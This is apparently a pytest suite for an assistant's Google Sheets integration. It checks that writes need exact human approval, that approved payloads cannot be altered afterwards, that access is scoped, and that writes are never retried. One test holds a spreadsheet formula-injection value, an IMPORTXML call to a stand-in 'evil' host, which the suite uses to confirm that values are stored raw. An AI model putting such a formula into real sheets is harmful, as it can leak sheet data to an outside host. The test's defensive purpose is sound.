"""Google Sheets: reads are immediate, every write needs one exact, verified approval."""

import uuid

import httpx
import pytest
from fastapi import FastAPI
from sqlalchemy import select, update

from cognitive_mesh.agents.schemas import ManagerDecision
from cognitive_mesh.integrations import google_sheets as gs
from cognitive_mesh.integrations.actions import ACTIONS
from cognitive_mesh.integrations.gateway import (
    APPROVED_ACTION_TOOLS,
    READ_ONLY_TOOLS,
    ActionOutcomeUnknownError,
)
from cognitive_mesh.models import Approval, ConnectionStatus, IntegrationConnection, Publication
from cognitive_mesh.workflows.command_router import route_command
from cognitive_mesh.workflows.manager_routing import route_from_decision
from cognitive_mesh.workflows.sheet_commands import continue_sheet, parse_rows, parse_sheet_command
from tests.conftest import FakeGateway, auth_headers
from tests.fakes_ai import FakeTeam
from tests.test_graph_approval import approvals_for, approve, fresh_runner
from tests.test_runner import status

ALICE = auth_headers("user_alice")
BOB = auth_headers("user_bob")
SHEET_ID = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms"
CUSTOMERS = {"id": SHEET_ID, "name": "Customers"}
CREATED = {
    "spreadsheetId": SHEET_ID,
    "spreadsheetUrl": f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/edit",
    "sheets": [{"properties": {"title": "Sheet1"}}],
}
APPENDED = {"spreadsheetId": SHEET_ID, "updates": {"spreadsheetId": SHEET_ID, "updatedRange": "Sheet1!A2:C2"}}
CREATE = "Create a sheet called Customers with columns Name, Email, Amount"
APPEND = "Add row Ali, ali@example.com, 5000 to sheet Customers"
UPDATE = "Update cell B2 in sheet Customers to 7500"


async def connect_sheets(client, app, headers=ALICE, scopes=None) -> None:  # type: ignore[no-untyped-def]
    me = (await client.get("/api/me", headers=headers)).json()
    async with app.state.db.sessionmaker() as s:
        s.add(
            IntegrationConnection(
                workspace_id=uuid.UUID(me["workspace"]["id"]),
                user_id=uuid.UUID(me["user"]["id"]),
                toolkit_slug="googlesheets",
                composio_account_id=f"ca_sheet_{uuid.uuid4().hex[:8]}",
                status=ConnectionStatus.ACTIVE,
                granted_scopes=scopes or ["https://www.googleapis.com/auth/spreadsheets"],
            )
        )
        await s.commit()


async def new_chat(client: httpx.AsyncClient) -> str:
    return (await client.post("/api/chats", headers=ALICE, json={})).json()["id"]


async def say(client: httpx.AsyncClient, app: FastAPI, chat: str, text: str) -> dict:
    task = (await client.post(f"/api/chats/{chat}/tasks", headers=ALICE, json={"request": text})).json()
    await app.state.runner.run_once()
    return task


async def last_reply(client: httpx.AsyncClient, chat: str) -> str:
    return (await client.get(f"/api/chats/{chat}", headers=ALICE)).json()["messages"][-1]["content"]


async def paused(client: httpx.AsyncClient, app: FastAPI, text: str) -> tuple[dict, dict]:
    await connect_sheets(client, app)
    task = await say(client, app, await new_chat(client), text)
    assert await status(client, task) == "AWAITING_APPROVAL"
    return task, (await approvals_for(client, task))[0]


# ---------- command parsing ----------
def test_create_command() -> None:
    command = parse_sheet_command(CREATE)
    assert command is not None and command.kind == "create" and command.name == "Customers"
    assert command.rows == (("Name", "Email", "Amount"),) and command.missing is None


def test_append_keeps_exact_values() -> None:
    command = parse_sheet_command(APPEND)
    assert command is not None and command.kind == "append" and command.name == "Customers"
    assert command.rows == (("Ali", "ali@example.com", "5000"),)


def test_append_with_colon_and_multiple_rows() -> None:
    command = parse_sheet_command("Add to sheet Customers: Ali, 10\nSara, 20")
    assert command is not None and command.rows == (("Ali", "10"), ("Sara", "20"))


def test_quoted_commas_stay_in_one_cell() -> None:
    assert parse_rows('"Lahore, Pakistan", 5') == (("Lahore, Pakistan", "5"),)


def test_update_command() -> None:
    command = parse_sheet_command(UPDATE)
    assert command is not None and (command.kind, command.cell, command.value, command.name) == (
        "update", "B2", "7500", "Customers"
    )


@pytest.mark.parametrize(
    ("text", "kind"),
    [("list my sheets", "list"), ("read sheet Customers", "read"), ("show the sheet Customers", "read")],
)
def test_read_commands(text: str, kind: str) -> None:
    command = parse_sheet_command(text)
    assert command is not None and command.kind == kind


@pytest.mark.parametrize(
    "text",
    [
        "Write a LinkedIn post about spreadsheets",
        "Post this on LinkedIn: add row to sheet",
        "Send an email to ann@example.com about the sheet",
        "Schedule a meeting tomorrow at 3pm",
        "add dentist appointment to my calendar tomorrow at 3pm",
    ],
)
def test_other_commands_are_not_sheets(text: str) -> None:
    assert route_command(text).action != "sheets"


def test_missing_details_continue() -> None:
    command = parse_sheet_command("create a new spreadsheet")
    assert command is not None and command.missing == "name"
    assert continue_sheet(command, "Leads").name == "Leads"


# ---------- payload rules ----------
def test_values_are_always_raw_so_formulas_cannot_run() -> None:
    payload = gs.build_append_payload(
        spreadsheet_id=SHEET_ID, name="X", tab="Sheet1", rows=[['=IMPORTXML("http://evil","//a")']]
    )
    assert payload["arguments"]["valueInputOption"] == "RAW"
    tampered = {**payload, "arguments": {**payload["arguments"], "valueInputOption": "USER_ENTERED"}}
    with pytest.raises(gs.InvalidSheetActionError):
        gs.validate_append(tampered)


def test_tab_names_are_quoted_safely() -> None:
    payload = gs.build_update_payload(
        spreadsheet_id=SHEET_ID, name="X", tab="Bob's Q3", cell="B2", value="1", previous=""
    )
    assert payload["arguments"]["range"] == "'Bob''s Q3'!B2"


def test_only_approved_sheet_tools_are_allowlisted() -> None:
    tools = {a.tool_slug for a in ACTIONS.values() if a.toolkit == "googlesheets"}
    assert tools == {gs.CREATE_TOOL, gs.APPEND_TOOL, gs.UPDATE_TOOL}
    assert tools <= APPROVED_ACTION_TOOLS and not tools & READ_ONLY_TOOLS
    assert not any("GOOGLESHEETS" in t and ("DELETE" in t or "CLEAR" in t) for t in APPROVED_ACTION_TOOLS)


# ---------- reads ----------
async def test_read_answers_without_ai_or_approval(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway, team: FakeTeam
) -> None:
    gateway.sheets = [CUSTOMERS]
    gateway.sheet_values = [["Name", "Amount"], ["Ali", "5000"]]
    await connect_sheets(client, app)
    chat = await new_chat(client)
    task = await say(client, app, chat, "read sheet Customers")
    reply = await last_reply(client, chat)
    assert await status(client, task) == "COMPLETED" and "Ali | 5000" in reply
    assert (await approvals_for(client, task)) == [] and gateway.publish_calls == []
    assert team.manager_calls == [] and team.email_calls == []


async def test_similar_name_is_never_guessed(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets = [{"id": SHEET_ID, "name": "Customers 2024"}]
    await connect_sheets(client, app)
    chat = await new_chat(client)
    task = await say(client, app, chat, APPEND)
    assert "exact name" in await last_reply(client, chat)
    assert (await approvals_for(client, task)) == []


async def test_several_tabs_ask_which_one(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets, gateway.sheet_tabs = [CUSTOMERS], ["Leads", "Paid"]
    await connect_sheets(client, app)
    chat = await new_chat(client)
    await say(client, app, chat, APPEND)
    assert "several tabs" in await last_reply(client, chat)


# ---------- writes ----------
async def test_create_writes_exact_columns_under_one_approval(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.publish_response = CREATED
    task, a = await paused(client, app, CREATE)
    assert gateway.publish_calls == []
    await approve(client, a)
    await app.state.runner.run_once()
    assert await status(client, task) == "COMPLETED"
    assert [c["tool"] for c in gateway.publish_calls] == [gs.CREATE_TOOL, gs.APPEND_TOOL]
    second = gateway.publish_calls[1]
    assert second["arguments"]["values"] == [["Name", "Email", "Amount"]]
    assert second["arguments"]["valueInputOption"] == "RAW" and second["arguments"]["range"] == "Sheet1"
    rows = (await client.get(f"/api/tasks/{task['id']}/publications", headers=ALICE)).json()
    assert rows[0]["external_url"] == f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/edit"


async def test_failed_second_step_is_reported_and_not_retried(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway, monkeypatch: pytest.MonkeyPatch
) -> None:
    gateway.publish_response = CREATED
    task, a = await paused(client, app, CREATE)
    original = gateway.execute_approved_action

    async def fail_second(**kwargs):  # type: ignore[no-untyped-def]
        if kwargs["tool_slug"] == gs.APPEND_TOOL:
            gateway.publish_calls.append({"tool": gs.APPEND_TOOL})
            raise ActionOutcomeUnknownError("timeout")
        return await original(**kwargs)

    monkeypatch.setattr(gateway, "execute_approved_action", fail_second)
    await approve(client, a)
    await app.state.runner.run_once()
    chat = (await client.get(f"/api/chats/{task['chat_id']}", headers=ALICE)).json()
    assert "couldn't confirm that your rows" in chat["messages"][-1]["content"]
    assert len(gateway.publish_calls) == 2


async def test_append_needs_approval_and_sends_exact_rows(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway, team: FakeTeam
) -> None:
    gateway.sheets, gateway.publish_response = [CUSTOMERS], APPENDED
    task, a = await paused(client, app, APPEND)
    assert gateway.publish_calls == [] and team.manager_calls == []
    await approve(client, a)
    await app.state.runner.run_once()
    call = gateway.publish_calls[0]
    assert call["tool"] == gs.APPEND_TOOL and call["arguments"]["values"] == [["Ali", "ali@example.com", "5000"]]
    assert call["arguments"]["spreadsheetId"] == SHEET_ID and await status(client, task) == "COMPLETED"


async def test_update_shows_the_value_being_replaced(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets, gateway.sheet_values = [CUSTOMERS], [["5000"]]
    gateway.publish_response = {"spreadsheetId": SHEET_ID, "updatedRange": "Sheet1!B2"}
    _task, a = await paused(client, app, UPDATE)
    assert a["payload"]["previous"] == "5000" and a["payload"]["value"] == "7500"
    await approve(client, a)
    await app.state.runner.run_once()
    call = gateway.publish_calls[0]
    assert call["tool"] == gs.UPDATE_TOOL and call["arguments"]["range"] == "'Sheet1'!B2"
    assert call["arguments"]["values"] == [["7500"]]


async def test_follow_up_can_use_the_sheet_created_in_this_chat(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.publish_response = CREATED
    await connect_sheets(client, app)
    chat = await new_chat(client)
    first = await say(client, app, chat, CREATE)
    await approve(client, (await approvals_for(client, first))[0])
    await app.state.runner.run_once()
    second = await say(client, app, chat, "Add row Sara, sara@example.com, 900 to it")
    a = (await approvals_for(client, second))[0]
    assert a["payload"]["arguments"]["spreadsheetId"] == SHEET_ID


async def test_missing_details_continue_in_chat(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    await connect_sheets(client, app)
    chat = await new_chat(client)
    await say(client, app, chat, "create a new spreadsheet")
    assert "What should I name" in await last_reply(client, chat)
    task = await say(client, app, chat, "Leads")
    assert (await approvals_for(client, task))[0]["payload"]["arguments"] == {"title": "Leads"}


# ---------- Manager routing ----------
def test_manager_cannot_invent_sheet_values() -> None:
    decision = ManagerDecision(
        target="sheets", action="sheet_append", sheet_name="Customers", rows=[["Ali", "9999"]]
    )
    route, _question = route_from_decision(decision, "put ali in my customers sheet")
    assert route.sheet is not None and route.sheet.rows == () and route.sheet.missing == "rows"


def test_manager_routes_natural_language_to_sheets() -> None:
    decision = ManagerDecision(
        target="sheets", action="sheet_append", sheet_name="customers", rows=[["ali", "5000"]]
    )
    route, _question = route_from_decision(decision, "pls note ali paid 5000 in customers")
    assert route.action == "sheets" and route.sheet is not None
    assert route.sheet.rows == (("ali", "5000"),) and route.sheet.missing is None


# ---------- safety ----------
async def test_rejection_never_writes(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets = [CUSTOMERS]
    _task, a = await paused(client, app, APPEND)
    await client.post(f"/api/approvals/{a['id']}/reject", headers=ALICE, json={})
    await app.state.runner.run_once()
    assert gateway.publish_calls == []


async def test_changed_rows_after_approval_are_blocked(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets = [CUSTOMERS]
    task, a = await paused(client, app, APPEND)
    await approve(client, a)
    changed = {**a["payload"], "rows": [["Evil"]], "arguments": {**a["payload"]["arguments"], "values": [["Evil"]]}}
    async with app.state.db.sessionmaker() as s:
        await s.execute(update(Approval).where(Approval.id == uuid.UUID(a["id"])).values(payload=changed))
        await s.commit()
    await app.state.runner.run_once()
    assert gateway.publish_calls == [] and await status(client, task) == "FAILED"


async def test_read_only_grant_cannot_write(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets = [CUSTOMERS]
    await connect_sheets(client, app, scopes=["https://www.googleapis.com/auth/spreadsheets.readonly"])
    task = await say(client, app, await new_chat(client), APPEND)
    await approve(client, (await approvals_for(client, task))[0])
    await app.state.runner.run_once()
    assert gateway.publish_calls == [] and await status(client, task) == "FAILED"


async def test_not_connected_gives_guidance(client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway) -> None:
    chat = await new_chat(client)
    task = await say(client, app, chat, "read sheet Customers")
    assert await status(client, task) == "FAILED"
    assert "Google Sheets isn't connected" in await last_reply(client, chat)
    assert gateway.read_calls == []


class Crash(BaseException):
    pass


async def test_crash_during_write_is_never_repeated(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway, team: FakeTeam
) -> None:
    gateway.sheets = [CUSTOMERS]
    task, a = await paused(client, app, APPEND)
    gateway.publish_error = Crash()
    await approve(client, a)
    with pytest.raises(Crash):
        await app.state.runner.run_once()
    await app.state.runner.close()
    gateway.publish_error = None
    restarted = fresh_runner(app, gateway, team)
    try:
        await restarted.recover()
    finally:
        await restarted.close()
    assert len(gateway.publish_calls) == 1 and await status(client, task) == "FAILED"
    async with app.state.db.sessionmaker() as s:
        row = await s.scalar(select(Publication))
    assert row is not None and row.status == "NEEDS_CHECK"


async def test_sheet_approval_is_workspace_isolated(
    client: httpx.AsyncClient, app: FastAPI, gateway: FakeGateway
) -> None:
    gateway.sheets = [CUSTOMERS]
    _task, a = await paused(client, app, APPEND)
    await client.get("/api/me", headers=BOB)
    body = {"payload_hash": a["payload_hash"], "content_version": a["content_version"]}
    assert (await client.post(f"/api/approvals/{a['id']}/approve", headers=BOB, json=body)).status_code == 404
